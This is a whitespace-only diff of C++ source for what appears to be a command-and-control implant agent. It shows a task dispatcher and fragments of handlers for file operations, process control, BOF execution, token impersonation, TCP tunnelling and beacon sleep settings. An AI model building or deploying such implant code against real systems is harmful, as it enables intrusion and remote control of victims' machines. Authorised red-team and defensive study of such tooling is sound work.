@@ -21,17 +21,17 @@ void Commander::ProcessCommandTasks(BYTE* recv, ULONG recvSize, Packer* outPacke
 	}
 
 	while ( packerSize + 4 > inPacker->datasize())
-	{	
+	{
 		ULONG CommandId = inPacker->Unpack32();
 		switch ( CommandId )
 		{
 		case COMMAND_CAT:
 			this->CmdCat(CommandId, inPacker, outPacker); break;
-		
-		case COMMAND_CD:        
+
+		case COMMAND_CD:
 			this->CmdCd(CommandId, inPacker, outPacker); break;
-	
-		case COMMAND_CP:   
+
+		case COMMAND_CP:
 			this->CmdCp(CommandId, inPacker, outPacker); break;
 
 		case COMMAND_DISKS:
@@ -44,7 +44,7 @@ void Commander::ProcessCommandTasks(BYTE* recv, ULONG recvSize, Packer* outPacke
 			this->CmdDownloadState(CommandId, inPacker, outPacker); break;
 
 		case COMMAND_EXEC_BOF:
-			this->CmdExecBof(CommandId, inPacker, outPacker); 
+			this->CmdExecBof(CommandId, inPacker, outPacker);
 			if (bofImpersonate != 1)
 				this->AlertImpersonated(outPacker);
 			break;
@@ -54,7 +54,7 @@ void Commander::ProcessCommandTasks(BYTE* recv, ULONG recvSize, Packer* outPacke
 
 		case COMMAND_JOBS_LIST:
 			this->CmdJobsList(CommandId, inPacker, outPacker); break;
-			
+
 		case COMMAND_JOBS_KILL:
 			this->CmdJobsKill(CommandId, inPacker, outPacker); break;
 
@@ -85,7 +85,7 @@ void Commander::ProcessCommandTasks(BYTE* recv, ULONG recvSize, Packer* outPacke
 		case COMMAND_PS_RUN:
 			this->CmdPsRun(CommandId, inPacker, outPacker); break;
 
-		case COMMAND_PWD:       
+		case COMMAND_PWD:
 			this->CmdPwd(CommandId, inPacker, outPacker); break;
 
 		case COMMAND_REV2SELF:
@@ -94,9 +94,9 @@ void Commander::ProcessCommandTasks(BYTE* recv, ULONG recvSize, Packer* outPacke
 		case COMMAND_RM:
 			this->CmdRm(CommandId, inPacker, outPacker); break;
 
-		case COMMAND_TERMINATE: 
+		case COMMAND_TERMINATE:
 			this->CmdTerminate(CommandId, inPacker, outPacker); break;
-		
+
 		case COMMAND_TUNNEL_START_TCP:
 			this->CmdTunnelMsgConnectTCP(CommandId, inPacker, outPacker); break;
 
@@ -209,7 +209,7 @@ void Commander::CmdCp(ULONG commandId, Packer* inPacker, Packer* outPacker)
 	BOOL result = ApiWin->CopyFileA(src, dst, FALSE);
 	if (result) {
 		outPacker->Pack32(commandId);
-	}      
+	}
 	else {
 		outPacker->Pack32(COMMAND_ERROR);
 		outPacker->Pack32(TEB->LastErrorValue);
@@ -230,7 +230,7 @@ void Commander::CmdDisks(ULONG commandId, Packer* inPacker, Packer* outPacker)
 	}
 	else {
 		outPacker->Pack8(TRUE);
-		
+
 		ULONG count = 0;
 		ULONG indexCount = outPacker->datasize();
 		outPacker->Pack32(0);
@@ -474,12 +474,12 @@ void Commander::CmdLs(ULONG commandId, Packer* inPacker, Packer* outPacker)
 
 		do {
 			BOOL isDir = (findData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) == FILE_ATTRIBUTE_DIRECTORY;
-			
+
 			if( isDir && StrLenA(findData.cFileName) == 1 && findData.cFileName[0] == 0x2e )
 				continue;
 			if (isDir && StrLenA(findData.cFileName) == 2 && findData.cFileName[0] == 0x2e && findData.cFileName[1] == 0x2e)
 				continue;
-			
+
 			ULONG64 size = 0;
 			((ULONG*)&size)[1] = findData.nFileSizeHigh;
 			((ULONG*)&size)[0] = findData.nFileSizeLow;
@@ -570,11 +570,11 @@ void Commander::CmdProfile(ULONG commandId, Packer* inPacker, Packer* outPacker)
 		outPacker->Pack32(subcommand);
 		outPacker->Pack32(agent->config->sleep_delay);
 		outPacker->Pack32(agent->config->jitter_delay);
-	} 
+	}
 	else if (subcommand == 2) { // download chunks size
 		ULONG size   = inPacker->Unpack32();
 		ULONG taskId = inPacker->Unpack32();
-		
+
 		agent->downloader->chunkSize = size;
 
 		outPacker->Pack32(taskId);
@@ -729,7 +729,7 @@ void Commander::CmdPsKill(ULONG commandId, Packer* inPacker, Packer* outPacker)
 	ULONG taskId = inPacker->Unpack32();
 
 	outPacker->Pack32(taskId);
-	
+
 	OBJECT_ATTRIBUTES ObjectAttr = { sizeof(OBJECT_ATTRIBUTES) };
 	InitializeObjectAttributes(&ObjectAttr, NULL, 0, NULL, NULL);
 
@@ -867,7 +867,7 @@ void Commander::CmdTerminate(ULONG commandId, Packer* inPacker, Packer* outPacke
 	agent->SetActive(FALSE);
 }
 
-void Commander::CmdTunnelMsgConnectTCP(ULONG commandId, Packer* inPacker, Packer* outPacker) 
+void Commander::CmdTunnelMsgConnectTCP(ULONG commandId, Packer* inPacker, Packer* outPacker)
 {
 	ULONG channelId = inPacker->Unpack32();
 	ULONG addrSize  = 0;
@@ -937,7 +937,7 @@ void Commander::CmdUpload(ULONG commandId, Packer* inPacker, Packer* outPacker)
 	ULONG pathSize = 0;
 	CHAR* path     = (CHAR*)inPacker->UnpackBytes(&pathSize);
 	ULONG taskId   = inPacker->Unpack32();
-	
+
 	outPacker->Pack32(taskId);
 
 	if ( !agent->memorysaver->chunks.contains(memoryId) )
@@ -1006,7 +1006,7 @@ void Commander::AlertImpersonated(Packer* outPacker)
 
 		MemFreeLocal((LPVOID*)&username, 512);
 		MemFreeLocal((LPVOID*)&domain, 512);
-	} 
+	}
 	else {
 		outPacker->Pack32(0);
 		outPacker->Pack32(COMMAND_REV2SELF);
